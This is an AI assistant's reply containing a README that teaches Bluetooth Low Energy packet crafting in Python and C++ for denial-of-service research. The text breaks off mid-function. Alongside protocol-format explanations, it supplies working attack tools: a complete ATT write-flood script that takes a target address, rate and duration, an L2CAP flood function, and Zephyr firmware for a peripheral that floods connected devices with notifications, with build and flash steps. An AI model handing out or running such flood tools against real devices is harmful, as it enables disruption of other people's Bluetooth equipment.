I'll create a comprehensive README that teaches BLE packet crafting in both Python and C++, focused on your DoS research needs.

```markdown
# BLE Packet Crafting Mastery Guide
## Python & C++ Implementation for Security Research

> **Goal:** Master binary-level BLE packet construction in Python and C++ to craft attack payloads for controlled security testing and dataset generation.

> **Prerequisites:** Basic understanding of BLE protocol layers (from previous document), Python 3.8+, C++17, Linux development environment.

---

## Table of Contents

1. [Binary Data Fundamentals](#1-binary-data-fundamentals)
2. [Python Packet Crafting](#2-python-packet-crafting)
3. [C++ Packet Crafting](#3-c-packet-crafting)
4. [Layer-by-Layer Crafting Examples](#4-layer-by-layer-crafting-examples)
5. [Validation & Debugging](#5-validation--debugging)
6. [Complete Attack Implementations](#6-complete-attack-implementations)
7. [Reference Tables](#7-reference-tables)

---

## 1. Binary Data Fundamentals

### 1.1 Why Binary Manipulation Matters

BLE protocols use binary-packed structures for efficiency. Understanding how to manipulate bytes directly is essential for:
- **Crafting malformed packets** (fuzzing)
- **Bypassing library abstractions** (direct HCI access)
- **Precise control** over header fields (SN/NESN for retransmission attacks)
- **Performance** (minimize overhead in floods)

### 1.2 Essential Concepts

#### Endianness
```
Big-endian (Network Byte Order):
    0x1234 → [0x12, 0x34]
    Most significant byte first

Little-endian (Bluetooth uses this):
    0x1234 → [0x34, 0x12]
    Least significant byte first
```

**Python:**
```python
import struct

# Pack as little-endian 16-bit unsigned int
value = 0x1234
packed = struct.pack('<H', value)  # '<' = little-endian, 'H' = unsigned short
print(packed.hex())  # '3412'

# Unpack
unpacked = struct.unpack('<H', packed)[0]
print(hex(unpacked))  # '0x1234'
```

**C++:**
```cpp
#include <cstdint>
#include <cstring>

uint16_t value = 0x1234;
uint8_t buffer[2];

// Manual little-endian pack
buffer[0] = value & 0xFF;         // Low byte
buffer[1] = (value >> 8) & 0xFF;  // High byte

// Or use memcpy (assumes little-endian host)
memcpy(buffer, &value, sizeof(value));
```

#### Bit Fields & Masking
```
BLE LL Data PDU Header (2 bytes):
  Bits 0-1:   LLID (2 bits)
  Bit 2:      NESN (1 bit)
  Bit 3:      SN (1 bit)
  Bit 4:      MD (1 bit)
  Bits 5-7:   RFU (3 bits, reserved)
  Bits 8-15:  Length (8 bits)
```

**Python:**
```python
# Set individual fields
llid = 0x2   # 2 bits: 0b10
nesn = 0x1   # 1 bit
sn = 0x0     # 1 bit
md = 0x0     # 1 bit
length = 0x08  # 8 bits

# Pack into 16-bit value
header = (llid << 0) | (nesn << 2) | (sn << 3) | (md << 4) | (length << 8)
packed = struct.pack('<H', header)

# Extract fields (reverse)
llid_extracted = (header >> 0) & 0x3   # Mask 2 bits
nesn_extracted = (header >> 2) & 0x1   # Mask 1 bit
sn_extracted = (header >> 3) & 0x1
```

**C++:**
```cpp
// Using bit fields (compiler-dependent layout)
struct LLDataPDUHeader {
    uint8_t llid : 2;
    uint8_t nesn : 1;
    uint8_t sn : 1;
    uint8_t md : 1;
    uint8_t rfu : 3;
    uint8_t length;
} __attribute__((packed));

// Manual bit manipulation (portable)
uint16_t create_ll_header(uint8_t llid, uint8_t nesn, uint8_t sn, uint8_t md, uint8_t length) {
    return (llid & 0x3) | 
           ((nesn & 0x1) << 2) | 
           ((sn & 0x1) << 3) | 
           ((md & 0x1) << 4) | 
           (length << 8);
}
```

---

## 2. Python Packet Crafting

### 2.1 Using `struct` Module (Low-Level)

**Best for:** HCI commands, L2CAP headers, ATT PDUs

#### Example: HCI Command Packet
```python
import struct

def build_hci_command(ogf: int, ocf: int, params: bytes = b'') -> bytes:
    """
    HCI Command Packet:
      Byte 0:       Packet Type (0x01)
      Bytes 1-2:    OpCode (OGF[6] + OCF[10]) - little-endian
      Byte 3:       Parameter Length
      Bytes 4-N:    Parameters
    """
    opcode = (ogf << 10) | ocf
    param_len = len(params)
    
    # Pack: B=uint8, H=uint16 little-endian, B=uint8
    packet = struct.pack('<BHB', 0x01, opcode, param_len) + params
    return packet

# Example: LE Set Advertising Enable
ogf = 0x08  # LE Controller Commands
ocf = 0x000A  # LE Set Advertising Enable
params = struct.pack('<B', 0x01)  # Enable = 1

hci_cmd = build_hci_command(ogf, ocf, params)
print("HCI Command:", hci_cmd.hex())
# Output: 010a20010 1
#         ^^ ^^ ^^  ^^
#         |  |  |   └─ Param: Enable=1
#         |  |  └───── Length=1
#         |  └──────── OpCode=0x200A (little-endian)
#         └─────────── Packet Type=0x01
```

#### Example: L2CAP Header + ATT Write Command
```python
def build_att_write_command(handle: int, value: bytes) -> bytes:
    """
    ATT Write Command (0x52 - Write Without Response):
      Byte 0:       Opcode (0x52)
      Bytes 1-2:    Attribute Handle (little-endian)
      Bytes 3-N:    Value
    """
    opcode = 0x52
    att_pdu = struct.pack('<BH', opcode, handle) + value
    return att_pdu

def build_l2cap_packet(cid: int, payload: bytes) -> bytes:
    """
    L2CAP Basic Header:
      Bytes 0-1:    Length (little-endian)
      Bytes 2-3:    Channel ID (CID)
      Bytes 4-N:    Payload
    """
    length = len(payload)
    l2cap_header = struct.pack('<HH', length, cid)
    return l2cap_header + payload

# Craft full packet
handle = 0x0010
value = b'\xFF' * 100

att_pdu = build_att_write_command(handle, value)
l2cap_packet = build_l2cap_packet(cid=0x0004, payload=att_pdu)  # CID 0x0004 = ATT

print(f"L2CAP Length: {len(att_pdu)}")
print(f"Full packet length: {len(l2cap_packet)}")
print(f"First 20 bytes: {l2cap_packet[:20].hex()}")
```

#### Example: Link Layer Advertising PDU
```python
def build_adv_ind_pdu(adv_addr: bytes, adv_data: bytes) -> bytes:
    """
    LL Advertising PDU (ADV_IND):
      Byte 0:       Header (PDU Type[4], RFU[2], TxAdd[1], RxAdd[1])
      Byte 1:       Length (6 + len(adv_data))
      Bytes 2-7:    AdvA (Advertiser Address)
      Bytes 8-N:    AdvData
    
    Note: CRC is added by controller, not included here
    """
    pdu_type = 0x0  # ADV_IND
    tx_add = 0x1    # Random address
    rx_add = 0x0    # Not used for ADV_IND
    
    header = (pdu_type << 0) | (tx_add << 6) | (rx_add << 7)
    length = 6 + len(adv_data)  # 6 bytes for AdvAddr
    
    pdu = struct.pack('<BB', header, length) + adv_addr + adv_data
    return pdu

# Example usage
adv_addr = bytes.fromhex('AABBCCDDEEFF')  # MAC address
adv_data = b'\x02\x01\x06\x09\xFFAttacker'  # Flags + Local Name

pdu = build_adv_ind_pdu(adv_addr, adv_data)
print("ADV_IND PDU:", pdu.hex())
```

### 2.2 Using Scapy (High-Level)

**Best for:** Quick prototyping, packet analysis, replay attacks

#### Installation
```bash
pip3 install scapy
pip3 install scapy[bluetooth]
```

#### Example: Craft BLE Advertising Packet
```python
from scapy.all import *
from scapy.layers.bluetooth import *

# Build advertising packet
pkt = BTLE() / BTLE_ADV(RxAdd=0, TxAdd=1) / BTLE_ADV_IND(
    AdvA='AA:BB:CC:DD:EE:FF',
    data=[
        EIR_Hdr() / EIR_Flags(flags=['general_disc_mode', 'br_edr_not_supported']),
        EIR_Hdr() / EIR_CompleteLocalName(local_name=b'AttackDevice')
    ]
)

# Display packet structure
pkt.show()

# Get raw bytes
raw_bytes = bytes(pkt)
print("Raw packet:", raw_bytes.hex())

# Send packet (requires raw socket access)
# sendp(pkt, iface="hci0")  # Not typically used for BLE; use HCI commands instead
```

#### Example: Parse Captured Packet
```python
# Read from PCAP
packets = rdpcap('capture.pcap')

for pkt in packets:
    if BTLE_ADV in pkt:
        print(f"AdvAddr: {pkt[BTLE_ADV].AdvA}")
        if BTLE_ADV_IND in pkt:
            print(f"AdvData: {bytes(pkt[BTLE_ADV_IND].data).hex()}")
    
    if ATT_Hdr in pkt:
        print(f"ATT Opcode: {hex(pkt[ATT_Hdr].opcode)}")
        if ATT_Write_Command in pkt:
            print(f"Handle: {hex(pkt[ATT_Write_Command].gatt_handle)}")
            print(f"Value: {bytes(pkt[ATT_Write_Command].data).hex()}")
```

### 2.3 Raw Socket Programming (Direct HCI Access)

**Best for:** Maximum control, bypassing BlueZ stack, HCI-level attacks

#### Example: Send HCI Command via Raw Socket
```python
import socket
import struct
import os

def send_hci_command(device_id: int, ogf: int, ocf: int, params: bytes = b'') -> bytes:
    """Send HCI command and read response"""
    
    # Create raw HCI socket (requires root)
    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
    sock.bind((device_id,))
    
    # Build command
    opcode = (ogf << 10) | ocf
    cmd = struct.pack('<BHB', 0x01, opcode, len(params)) + params
    
    # Send
    sock.send(cmd)
    
    # Read Command Complete event (optional)
    try:
        sock.settimeout(1.0)
        response = sock.recv(260)  # Max HCI event size
        return response
    except socket.timeout:
        return b''
    finally:
        sock.close()

# Example: LE Set Advertising Data
if os.geteuid() != 0:
    print("Must run as root!")
    exit(1)

device_id = 0  # hci0

# Advertising data: Flags + Complete Local Name
adv_data = bytes([
    0x02, 0x01, 0x06,  # Flags
    0x0C, 0x09, 0x41, 0x74, 0x74, 0x61, 0x63, 0x6B, 0x44, 0x65, 0x76  # "AttackDev"
])

# Pad to 31 bytes (HCI requires fixed-length param)
adv_data_padded = adv_data + b'\x00' * (31 - len(adv_data))
params = struct.pack('<B', len(adv_data)) + adv_data_padded

response = send_hci_command(device_id, ogf=0x08, ocf=0x0008, params=params)
print(f"Response: {response.hex()}")

# Enable advertising
enable_params = struct.pack('<B', 0x01)
send_hci_command(device_id, ogf=0x08, ocf=0x000A, params=enable_params)
print("Advertising enabled!")
```

#### Example: L2CAP Raw Socket
```python
import socket

def l2cap_flood(victim_addr: str, cid: int, payload: bytes, count: int):
    """Send raw L2CAP packets"""
    
    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
    
    # Note: For LE, use psm=0 and cid via setsockopt (complex)
    # This example shows Classic BT L2CAP (for reference)
    sock.connect((victim_addr, cid))
    
    for i in range(count):
        sock.send(payload)
        print(f"Sent packet {i+1}/{count}")
    
    sock.close()

# Example usage (requires established BLE connection first)
# l2cap_flood('AA:BB:CC:DD:EE:FF', cid=0x0004, payload=att_write_command, count=100)
```

### 2.4 Complete Python Attack Script: ATT Write Flood

```python
#!/usr/bin/env python3
"""
att_write_flood_manual.py - Craft ATT Write Commands manually
Demonstrates full packet construction from L2CAP to ATT
"""

import asyncio
from bleak import BleakClient
import struct
import time

class ManualATTFlooder:
    def __init__(self, address: str, char_handle: int):
        self.address = address
        self.char_handle = char_handle
        self.client = None
    
    def craft_att_write_command(self, value: bytes) -> bytes:
        """Craft ATT Write Command (0x52)"""
        opcode = 0x52
        pdu = struct.pack('<BH', opcode, self.char_handle) + value
        return pdu
    
    def craft_l2cap_packet(self, att_pdu: bytes) -> bytes:
        """Wrap ATT PDU in L2CAP header"""
        cid = 0x0004  # ATT channel
        length = len(att_pdu)
        header = struct.pack('<HH', length, cid)
        return header + att_pdu
    
    async def connect(self):
        """Establish BLE connection"""
        self.client = BleakClient(self.address)
        await self.client.connect()
        print(f"Connected to {self.address}")
        print(f"MTU: {self.client.mtu_size}")
    
    async def flood(self, payload_size: int, rate_hz: float, duration_s: float):
        """Execute flood attack"""
        if not self.client or not self.client.is_connected:
            raise Exception("Not connected!")
        
        # Craft payload
        payload = b'\xAA' * min(payload_size, self.client.mtu_size - 3)
        
        # Build packet
        att_pdu = self.craft_att_write_command(payload)
        l2cap_packet = self.craft_l2cap_packet(att_pdu)
        
        print(f"Packet structure:")
        print(f"  L2CAP Length: {len(att_pdu)}")
        print(f"  L2CAP CID: 0x0004 (ATT)")
        print(f"  ATT Opcode: 0x52 (Write Command)")
        print(f"  ATT Handle: 0x{self.char_handle:04X}")
        print(f"  Payload size: {len(payload)} bytes")
        print(f"  Total packet: {len(l2cap_packet)} bytes")
        print(f"\nFirst 32 bytes: {l2cap_packet[:32].hex()}")
        
        # Attack loop
        print(f"\nStarting flood: {rate_hz} Hz for {duration_s}s")
        stop_time = time.time() + duration_s
        count = 0
        errors = 0
        
        while time.time() < stop_time:
            try:
                # Note: bleak doesn't expose raw L2CAP send, so we use its write method
                # For true manual sending, need to use raw HCI ACL sockets
                await self.client.write_gatt_char(self.char_handle, payload, response=False)
                count += 1
                
                if rate_hz > 0:
                    await asyncio.sleep(1.0 / rate_hz)
            
            except Exception as e:
                errors += 1
                if errors < 5:
                    print(f"Error: {e}")
        
        actual_rate = count / duration_s
        print(f"\nFlood complete:")
        print(f"  Packets sent: {count}")
        print(f"  Errors: {errors}")
        print(f"  Actual rate: {actual_rate:.2f} Hz")
        print(f"  Efficiency: {(count / (count + errors)) * 100:.1f}%")
    
    async def disconnect(self):
        """Close connection"""
        if self.client:
            await self.client.disconnect()

async def main():
    import sys
    
    if len(sys.argv) != 6:
        print("Usage: python3 att_write_flood_manual.py <addr> <handle> <payload_size> <rate_hz> <duration_s>")
        print("Example: python3 att_write_flood_manual.py AA:BB:CC:DD:EE:FF 0x0010 512 50 30")
        sys.exit(1)
    
    address = sys.argv[1]
    handle = int(sys.argv[2], 16)
    payload_size = int(sys.argv[3])
    rate_hz = float(sys.argv[4])
    duration_s = float(sys.argv[5])
    
    flooder = ManualATTFlooder(address, handle)
    
    try:
        await flooder.connect()
        await flooder.flood(payload_size, rate_hz, duration_s)
    finally:
        await flooder.disconnect()

if __name__ == "__main__":
    asyncio.run(main())
```

---

## 3. C++ Packet Crafting

### 3.1 Linux Raw Sockets (Similar to Python)

**Best for:** High-performance attacks on Linux host

#### Example: HCI Command Sender
```cpp
// hci_command.cpp
#include <iostream>
#include <cstring>
#include <cstdint>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

class HCICommandSender {
private:
    int device_id;
    int sock;
    
public:
    HCICommandSender(int dev_id = 0) : device_id(dev_id), sock(-1) {}
    
    bool open() {
        sock = hci_open_dev(device_id);
        if (sock < 0) {
            std::cerr << "Failed to open HCI device " << device_id << std::endl;
            return false;
        }
        return true;
    }
    
    void close() {
        if (sock >= 0) {
            hci_close_dev(sock);
            sock = -1;
        }
    }
    
    bool send_command(uint8_t ogf, uint16_t ocf, const uint8_t* params, uint8_t param_len) {
        uint16_t opcode = htobs(cmd_opcode_pack(ogf, ocf));
        
        // Build command buffer
        uint8_t cmd[HCI_MAX_EVENT_SIZE];
        cmd[0] = HCI_COMMAND_PKT;
        memcpy(cmd + 1, &opcode, sizeof(opcode));
        cmd[3] = param_len;
        if (param_len > 0) {
            memcpy(cmd + 4, params, param_len);
        }
        
        // Send via raw socket
        int total_len = 4 + param_len;
        ssize_t written = write(sock, cmd, total_len);
        
        if (written < 0) {
            std::cerr << "Failed to send HCI command" << std::endl;
            return false;
        }
        
        return true;
    }
    
    // Example: LE Set Advertising Enable
    bool set_advertising_enable(bool enable) {
        uint8_t ogf = OGF_LE_CTL;
        uint16_t ocf = 0x000A;  // LE Set Advertising Enable
        uint8_t param = enable ? 0x01 : 0x00;
        
        return send_command(ogf, ocf, &param, 1);
    }
    
    // Example: LE Set Advertising Data
    bool set_advertising_data(const uint8_t* data, uint8_t length) {
        uint8_t ogf = OGF_LE_CTL;
        uint16_t ocf = 0x0008;  // LE Set Advertising Data
        
        uint8_t params[32];
        params[0] = length;
        memcpy(params + 1, data, length);
        memset(params + 1 + length, 0, 31 - length);  // Pad to 31 bytes
        
        return send_command(ogf, ocf, params, 32);
    }
};

int main() {
    if (geteuid() != 0) {
        std::cerr << "Must run as root!" << std::endl;
        return 1;
    }
    
    HCICommandSender hci(0);  // hci0
    
    if (!hci.open()) {
        return 1;
    }
    
    // Set advertising data
    uint8_t adv_data[] = {
        0x02, 0x01, 0x06,  // Flags
        0x09, 0x09, 'C', 'P', 'P', 'A', 't', 't', 'a', 'c', 'k'  // Local Name
    };
    
    if (hci.set_advertising_data(adv_data, sizeof(adv_data))) {
        std::cout << "Advertising data set!" << std::endl;
    }
    
    // Enable advertising
    if (hci.set_advertising_enable(true)) {
        std::cout << "Advertising enabled!" << std::endl;
    }
    
    sleep(10);  // Advertise for 10 seconds
    
    hci.set_advertising_enable(false);
    hci.close();
    
    return 0;
}
```

**Compilation:**
```bash
g++ -std=c++17 -o hci_command hci_command.cpp -lbluetooth
sudo ./hci_command
```

### 3.2 Manual Bit Manipulation (Portable)

#### Example: Craft LL Data PDU Header
```cpp
#include <cstdint>
#include <iostream>
#include <iomanip>

struct LLDataPDU {
    uint16_t header;  // LLID, NESN, SN, MD, Length
    uint8_t payload[251];  // Max LE Data Channel payload
};

uint16_t create_ll_header(uint8_t llid, uint8_t nesn, uint8_t sn, uint8_t md, uint8_t length) {
    /*
     * LL Data PDU Header (16 bits):
     *   Bits 0-1:   LLID
     *   Bit 2:      NESN
     *   Bit 3:      SN
     *   Bit 4:      MD
     *   Bits 5-7:   RFU (set to 0)
     *   Bits 8-15:  Length
     */
    
    uint16_t header = 0;
    header |= (llid & 0x03) << 0;
    header |= (nesn & 0x01) << 2;
    header |= (sn & 0x01) << 3;
    header |= (md & 0x01) << 4;
    header |= (length & 0xFF) << 8;
    
    return header;
}

void extract_ll_header(uint16_t header, uint8_t& llid, uint8_t& nesn, uint8_t& sn, uint8_t& md, uint8_t& length) {
    llid = (header >> 0) & 0x03;
    nesn = (header >> 2) & 0x01;
    sn = (header >> 3) & 0x01;
    md = (header >> 4) & 0x01;
    length = (header >> 8) & 0xFF;
}

int main() {
    // Create header: LLID=2 (start), NESN=0, SN=1, MD=0, Length=100
    uint16_t header = create_ll_header(0x2, 0, 1, 0, 100);
    
    std::cout << "LL Header: 0x" << std::hex << std::setw(4) << std::setfill('0') << header << std::endl;
    
    // Print as bytes (little-endian)
    uint8_t byte0 = header & 0xFF;
    uint8_t byte1 = (header >> 8) & 0xFF;
    std::cout << "Bytes: [0x" << std::hex << (int)byte0 << ", 0x" << (int)byte1 << "]" << std::endl;
    
    // Extract fields
    uint8_t llid, nesn, sn, md, length;
    extract_ll_header(header, llid, nesn, sn, md, length);
    
    std::cout << std::dec;
    std::cout << "Extracted fields:" << std::endl;
    std::cout << "  LLID: " << (int)llid << std::endl;
    std::cout << "  NESN: " << (int)nesn << std::endl;
    std::cout << "  SN: " << (int)sn << std::endl;
    std::cout << "  MD: " << (int)md << std::endl;
    std::cout << "  Length: " << (int)length << std::endl;
    
    return 0;
}
```

### 3.3 nRF52840 Firmware (Embedded)

**Best for:** Link-layer control, precise timing, SN/NESN manipulation

#### Example: Zephyr RTOS - Custom GATT Server with Notification Flood
```c
// main.c - Zephyr RTOS application
#include <zephyr/kernel.h>
#include <zephyr/bluetooth/bluetooth.h>
#include <zephyr/bluetooth/gatt.h>
#include <zephyr/bluetooth/uuid.h>

#define DEVICE_NAME "AttackPeripheral"

// Custom Service UUID: 0x1234
static struct bt_uuid_128 custom_svc_uuid = BT_UUID_INIT_128(
    0x00, 0x00, 0x12, 0x34, 0x00, 0x00, 0x10, 0x00,
    0x80, 0x00, 0x00, 0x80, 0x5f, 0x9b, 0x34, 0xfb
);

// Custom Characteristic UUID: 0x5678
static struct bt_uuid_128 custom_char_uuid = BT_UUID_INIT_128(
    0x00, 0x00, 0x56, 0x78, 0x00, 0x00, 0x10, 0x00,
    0x80, 0x00, 0x00, 0x80, 0x5f, 0x9b, 0x34, 0xfb
);

static uint8_t notification_data[512];
static bool attack_active = false;
static struct bt_conn *active_conn = NULL;

// GATT Characteristic Configuration Changed callback
static void ccc_cfg_changed(const struct bt_gatt_attr *attr, uint16_t value) {
    attack_active = (value == BT_GATT_CCC_NOTIFY);
    printk("Notifications %s\n", attack_active ? "enabled" : "disabled");
}

// Define GATT service
BT_GATT_SERVICE_DEFINE(custom_svc,
    BT_GATT_PRIMARY_SERVICE(&custom_svc_uuid),
    BT_GATT_CHARACTERISTIC(&custom_char_uuid.uuid,
                           BT_GATT_CHRC_NOTIFY,
                           BT_GATT_PERM_NONE,
                           NULL, NULL, NULL),
    BT_GATT_CCC(ccc_cfg_changed, BT_GATT_PERM_READ | BT_GATT_PERM_WRITE),
);

// Connection callbacks
static void connected(struct bt_conn *conn, uint8_t err) {
    if (err) {
        printk("Connection failed (err %u)\n", err);
        return;
    }
    
    active_conn = bt_conn_ref(conn);
    printk("Connected\n");
}

static void disconnected(struct bt_conn *conn, uint8_t reason) {
    printk("Disconnected (reason %u)\n", reason);
    
    if (active_conn) {
        bt_conn_unref(active_conn);
        active_conn = NULL;
    }
    attack_active = false;
}

BT_CONN_CB_DEFINE(conn_callbacks) = {
    .connected = connected,
    .disconnected = disconnected,
};

// Advertising data
static const struct bt_data ad[] = {
    BT_DATA_BYTES(BT_DATA_FLAGS, (BT_LE_AD_GENERAL | BT_LE_AD_NO_BREDR)),
    BT_DATA(BT_DATA_NAME_COMPLETE, DEVICE_NAME, sizeof(DEVICE_NAME) - 1),
};

// Notification flood thread
void notification_flood_thread(void) {
    // Prepare max-size payload
    memset(notification_data, 0xAA, sizeof(notification_data));
    
    struct bt_gatt_notify_params params = {
        .attr = &custom_svc.attrs[1],  // Characteristic attribute
        .data = notification_data,
        .len = sizeof(notification_data),
    };
    
    uint32_t count = 0;
    
    while (1) {
        if (attack_active && active_conn) {
            int err = bt_gatt_notify_cb(active_conn, &params);
            if (err) {
                printk("Notify error: %d\n", err);
            } else {
                count++;
                if (count % 100 == 0) {
                    printk("Sent %u notifications\n", count);
                }
            }
            
            // No delay → max rate
            k_yield();
        } else {
            k_sleep(K_MSEC(100));  // Wait if not attacking
        }
    }
}

K_THREAD_DEFINE(flood_thread, 2048, notification_flood_thread, NULL, NULL, NULL,
                7, 0, 0);

int main(void) {
    int err;
    
    printk("Starting BLE attack peripheral\n");
    
    // Initialize Bluetooth
    err = bt_enable(NULL);
    if (err) {
        printk("Bluetooth init failed (err %d)\n", err);
        return 0;
    }
    
    printk("Bluetooth initialized\n");
    
    // Start advertising
    err = bt_le_adv_start(BT_LE_ADV_CONN, ad, ARRAY_SIZE(ad), NULL, 0);
    if (err) {
        printk("Advertising failed to start (err %d)\n", err);
        return 0;
    }
    
    printk("Advertising started. Waiting for connection...\n");
    
    return 0;
}
```

**Build and Flash:**
```bash
cd ~/zephyrproject/zephyr

# Copy main.c to samples/bluetooth/custom_attack/src/
mkdir -p samples/bluetooth/custom_attack/src
cp main.c samples/bluetooth/custom_attack/src/

# Create prj.conf
cat > samples/bluetooth/custom_attack/prj.conf << EOF
CONFIG_BT=y
CONFIG_BT_PERIPHERAL=y
CONFIG_BT_DEVICE_NAME="AttackPeripheral"
CONFIG_BT_GATT_DYNAMIC_DB=y
EOF

# Build
west build -b nrf52840dongle_nrf52840 samples/bluetooth/custom_attack

# Flash (put dongle in bootloader mode)
nrfutil pkg generate --hw-version 52 --sd-req=0x00 \
    --application build/zephyr/zephyr.hex \
    --application-version 1 pkg.zip
nrfutil dfu usb-serial -pkg pkg.zip -p /dev/ttyACM0
```

---

## 4. Layer-by-Layer Crafting Examples

### 4.1 Link Layer: Advertising PDU

#### Python Implementation
```python
import struct

def craft_adv_ind(adv_addr: str, adv_data: bytes) -> bytes:
    """
    Craft ADV_IND PDU (connectable undirected advertising)
    
    Args:
        adv_addr: MAC address as string "AA:BB:CC:DD:EE:FF"
        adv_data: Advertising data payload (max 31 bytes)
    
    Returns:
        Complete LL Advertising PDU (without CRC)
    """
    
    # Convert MAC address to bytes
    addr_bytes = bytes.fromhex(adv_addr.replace(':', ''))
    
    # Header byte
    pdu_type = 0x0  # ADV_IND
    tx_add = 0x1    # Random address type
    rx_add = 0x0    # Not used for ADV_IND
    header = (pdu_type << 0) | (tx_add << 6) | (rx_add << 7)
    
    # Length byte (AdvAddr + AdvData)
    length = 6 + len(adv_data)
    
    # Assemble PDU
    pdu = struct.pack('<BB', header, length) + addr_bytes + adv_data
    
    return pdu

def craft_scan_rsp(adv_addr: str, scan_rsp_data: bytes) -> bytes:
    """Craft SCAN_RSP PDU"""
    addr_bytes = bytes.fromhex(adv_addr.replace(':', ''))
    
    pdu_type = 0x4  # SCAN_RSP
    tx_add = 0x1
    rx_add = 0x0
    header = (pdu_type << 0) | (tx_add << 6) | (rx_add << 7)
    
    length = 6 + len(scan_rsp_data)
    pdu = struct.pack('<BB', header, length) + addr_bytes + scan_rsp_data
    
    return pdu

# Example usage
adv_data = bytes([
    0x02, 0x01, 0x06,  # Flags: General Discoverable, BR/EDR Not Supported
    0x09, 0x09, 0x41, 0x74, 0x74, 0x61, 0x63, 0x6B, 0x65, 0x72  # Complete Local Name: "Attacker"
])

pdu = craft_adv_ind('AA:BB:CC:DD:EE:FF', adv_data)
print("ADV_IND PDU (hex):", pdu.hex())
print("Length:", len(pdu), "bytes")

# Breakdown
print("\nBreakdown:")
print(f"  Header: 0x{pdu[0]:02X}")
print(f"  Length: {pdu[1]}")
print(f"  AdvAddr: {pdu[2:8].hex()}")
print(f"  AdvData: {pdu[8:].hex()}")
```

#### C++ Implementation
```cpp
#include <vector>
#include <string>
#include <cstdint>
#include <sstream>
#include <iomanip>

std::vector<uint8_t> parse_mac_address(const std::string& mac) {
    std::vector<uint8_t> bytes;
    std::istringstream iss(mac);
    std::string byte_str;
    
    while (std::getline(iss, byte_str, ':')) {
        bytes.push_back(static_cast<uint8_t>(std::stoi(byte_str, nullptr, 16)));
    }
    
    return bytes;
}

std::vector<uint8_t> craft_adv_ind(const std::string& adv_addr, const std::vector<uint8_t>& adv_data) {
    std::vector<uint8_t> pdu;
    
    // Parse MAC address
    auto addr_bytes = parse_mac_address(adv_addr);
    
    // Header
    uint8_t pdu_type = 0x0;  // ADV_IND
    uint8_t tx_add = 0x1;    // Random
    uint8_t rx_add = 0x0;
    uint8_t header = (pdu_type << 0) | (tx_add << 6) | (rx_add << 7);
    
    // Length
    uint8_t length = 6 + adv_data.size();
    
    // Assemble
    pdu.push_back(header);
    pdu.push_back(length);
    pdu.insert(pdu.end(), addr_bytes.begin(), addr_bytes.end());
    pdu.insert(pdu.end(), adv_data.begin(), adv_data.end());
    
    return pdu;
}

int main() {
    // Advertising data: Flags + Local Name
    std::vector<uint8_t> adv_data = {
        0x02, 0x01, 0x06,  // Flags
        0x09, 0x09, 'A', 't', 't', 'a', 'c', 'k', 'e', 'r'
    };
    
    auto pdu = craft_adv_ind("AA:BB:CC:DD:EE:FF", adv_data);
    
    std::cout << "ADV_IND PDU: ";
    for (auto byte : pdu) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)byte;
    }
    std::cout << std::endl;
    
    return 0;
}
```

### 4.2 HCI Layer: ACL Data Packet

#### Python Implementation
```python
def craft_hci_acl_packet(conn_handle: int, pb_flag: int, bc_flag: int, data: bytes) -> bytes:
    """
    Craft HCI ACL Data Packet
    
    Args:
        conn_handle: Connection handle (12 bits)
        pb_flag: Packet Boundary flag (2 bits) - 0x2=First, 0x1=Continuing
        bc_flag: Broadcast flag (2 bits) - usually 0x0
        data: L2CAP packet data
    
    Returns:
        Complete HCI ACL packet
    """
    
    # HCI ACL Data packet type
    packet_type = 0x02
    
    # Handle + flags (16 bits total)
    handle_flags = (conn_handle & 0x0FFF) | ((pb_flag & 0x3) << 12) | ((bc_flag & 0x3) << 14)
    
    # Data length (16 bits)
    data_length = len(data)
    
    # Pack: B=packet_type, H=handle_flags (little-endian), H=length
    packet = struct.pack('<BHH', packet_type, handle_flags, data_length) + data
    
    return packet

# Example: Send L2CAP packet over established connection
conn_handle = 0x0040
pb_flag = 0x2  # First packet
bc_flag = 0x0  # Point-to-point

# L2CAP packet (ATT Write Command)
l2cap_data = bytes([
    0x03, 0x00,  # L2CAP Length = 3
    0x04, 0x00,  # L2CAP CID = 0x0004 (ATT)
    0x52,        # ATT Opcode = Write Command
    0x10, 0x00,  # Attribute Handle = 0x0010
])

hci_acl = craft_hci_acl_packet(conn_handle, pb_flag, bc_flag, l2cap_data)
print("HCI ACL packet:", hci_acl.hex())

# Breakdown
print("\nBreakdown:")
print(f"  Packet Type: 0x{hci_acl[0]:02X}")
print(f"  Handle+Flags: 0x{struct.unpack('<H', hci_acl[1:3])[0]:04X}")
print(f"  Data Length: {struct.unpack('<H', hci_acl[3:5])[0]}")
print(f"  Data: {hci_acl[5:].hex()}")
```

#### C++ Implementation
```cpp
std::vector<uint8_t> craft_hci_acl_packet(uint16_t conn_handle, uint8_t pb_flag, 
                                          uint8_t bc_flag, const std::vector<uint8_t>& data) {
    std::vector<uint8_t> packet;
    
    // Packet type
    packet.push_back(0x02);
    
    // Handle + flags (little-endian)
    uint16_t handle_flags = (conn_handle & 0x0FFF) | ((pb_flag & 0x3) << 12) | ((bc_flag & 0x3) << 14);
    packet.push_back(handle_flags & 0xFF);
    packet.push_back((handle_flags >> 8) & 0xFF);
    
    // Data length (little-endian)
    uint16_t data_length = data.size();
    packet.push_back(data_length & 0xFF);
    packet.push_back((data_length >> 8) & 0xFF);
    
    // Data
    packet.insert(packet.end(), data.begin(), data.end());
    
    return packet;
}
```

### 4.3 L2CAP Layer: Signaling Channel

#### Python Implementation
```python
def craft_l2cap_conn_param_update_req(identifier: int, interval_min: int, interval_max: int, 
                                       latency: int, timeout: int) -> bytes:
    """
    Craft L2CAP Connection Parameter Update Request
    
    Args:
        identifier: Request identifier (1-255, for matching response)
        interval_min: Min connection interval (units of 1.25ms)
        interval_max: Max connection interval
        latency: Slave latency (number of events)
        timeout: Supervision timeout (units of 10ms)
    
    Returns:
        Complete L2CAP signaling packet
    """
    
    # L2CAP Signaling Command
    code = 0x12  # Connection Parameter Update Request
    length = 8   # 4 × 16-bit parameters
    
    # Command parameters (all little-endian)
    params = struct.pack('<HHHH', interval_min, interval_max, latency, timeout)
    
    # L2CAP Signaling header
    signaling_pdu = struct.pack('<BBH', code, identifier, length) + params
    
    # Wrap in L2CAP basic header
    cid = 0x0005  # LE Signaling Channel
    l2cap_length = len(signaling_pdu)
